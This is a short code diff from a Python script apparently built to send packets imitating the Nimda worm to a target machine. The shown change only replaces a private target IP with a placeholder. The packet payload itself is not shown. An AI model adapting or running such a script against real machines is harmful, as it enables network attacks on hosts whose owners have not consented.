@@ -9,5 +9,5 @@ def send_nimda_packet(target_ip, target_port=80, source_ip="192.168.1.1", source
     send(packet)
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.98"  # Replace with the IP address of the target machine
+    target_ip = "192.168.xxx.xxx"  # Replace with the IP address of the target machine
     send_nimda_packet(target_ip)
